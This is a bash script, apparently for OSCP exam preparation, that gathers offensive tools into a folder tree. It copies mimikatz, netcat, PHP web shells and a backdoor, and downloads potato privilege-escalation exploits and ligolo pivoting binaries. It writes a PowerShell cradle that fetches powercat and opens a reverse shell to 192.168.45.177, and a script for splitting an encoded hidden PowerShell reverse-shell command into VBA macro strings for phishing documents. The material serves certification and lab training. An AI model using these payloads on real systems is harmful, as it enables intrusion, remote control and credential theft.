#!/bin/bash

# Make directories 

mkdir OSCP 
mkdir OSCP/linux
mkdir OSCP/linux/escalation
mkdir OSCP/windows
mkdir OSCP/windows/escalation
mkdir OSCP/windows/escalation/potatos
mkdir OSCP/pivoting
mkdir OSCP/pivoting/ligolo/
mkdir OSCP/pivoting/ligolo/windows-proxy
mkdir OSCP/pivoting/ligolo/windows-agent
mkdir OSCP/pivoting/ligolo/linux-proxy
mkdir OSCP/pivoting/ligolo/linux-agent
mkdir OSCP/windows/PowerShell
mkdir OSCP/windows/AD
mkdir OSCP/WebStuff



# Copy files 

cp /usr/share/windows-resources/PEASS-ng/winPEAS/winPEASexe/binaries/winPEASx64.exe OSCP/windows/escalation

cp /opt/winpeas/winPEASany.exe OSCP/windows/escalation/

cp /usr/share/windows-resources/binaries/nc.exe OSCP/windows/

cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe OSCP/windows/

cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 OSCP/windows/AD/

cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 OSCP/windows/AD/

cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 OSCP/windows/PowerShell/

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 OSCP/windows/PowerShell/

cp /usr/share/windows-resources/PEASS-ng/linPEAS/linpeas.sh OSCP/linux/escalation/

cp /opt/linpeas/linpeas.sh OSCP/linux/escalation/

cp /usr/bin/unix-privesc-check OSCP/linux/escalation/

cp /usr/share/webshells/php/simple-backdoor.php OSCP/WebStuff/

cp /usr/share/webshells/php/php-reverse-shell.php OSCP/WebStuff/

cp /usr/share/laudanum/aspx/shell.aspx OSCP/WebStuff/

#Download AD GPO Abuse 

wget https://github.com/Hackndo/pyGPOAbuse/archive/refs/heads/master.zip -P OSCP/windows/AD/ 

wget https://github.com/X-C3LL/GPOwned/archive/refs/heads/main.zip -P OSCP/windows/AD/

# Download ligolo and organize files based on proxy vs agent 

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz -P OSCP/pivoting/ligolo/linux-proxy/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz -P OSCP/pivoting/ligolo/linux-agent/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_windows_amd64.zip -P OSCP/pivoting/ligolo/windows-proxy/

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip -P OSCP/pivoting/ligolo/windows-agent/


# Potatos


wget https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe -P OSCP/windows/escalation/potatos/

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -P OSCP/windows/escalation/potatos/

wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip -P OSCP/windows/escalation/potatos/

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -P OSCP/windows/escalation/potatos/


#### Helpful Script Creation 


# BASE64 ENCODE, PULL POWERCAT AND RUN FOR CALL BACK 

cat << 'EOF' > OSCP/windows/PowerShell/pull_rev.ps1
$Text =  "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177/powercat.ps1');powercat -c 192.168.45.177 -p 443 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
EOF


#LDAP SEARCHER 
echo 'function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()' > OSCP/windows/AD/LDAPSearch.ps1




#LIGOLO QUICK CONFIGURATION SCRIPT 

echo 'import subprocess

def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")

def main():
    user = input("Enter the username for tuntap: ")
    ip_cidr = input("Enter the IP address and CIDR (e.g., 172.16.176.0/24): ")
    
    print("[+] Creating TUN/TAP interface...")
    run_command(f"sudo ip tuntap add user {user} mode tun ligolo")
    
    print("[+] Bringing up the interface...")
    run_command("sudo ip link set ligolo up")
    
    print("[+] Adding IP route...")
    run_command(f"sudo ip route add {ip_cidr} dev ligolo")
    
    print("[+] Configuration complete!")
    print("[***] Start proxy syntax : ./proxy -selfcert")
    print("[***] On agent side execute the following: ./agent.exe -connect <your_attack_box_ip>:11601 -ignore-cert")

if __name__ == "__main__":
    main()

' > OSCP/pivoting/ligolo/ligfig.py

#VBA BREAKUP FOR MACRO CLIENT SIDE ATTACKS 



cat <<EOF > OSCP/windows/vba_breakup.py
#!/bin/python3

# Be sure to encode your python script in b64 prior to breaking it up for your macro client-side attack

str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAxAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAxACAALQBwACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA== "

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')
EOF


### Install useful tools 

sudo apt-get install snmp-mibs-downloader
download-mibs 
echo '************* -> comment the line saying "mibs :" in /etc/snmp/snmp.conf <- **************'



### Install gitdumper ?


### ADD ALIASES ? (NC, PYTHON, CDL, CDW, CDA, CDP)


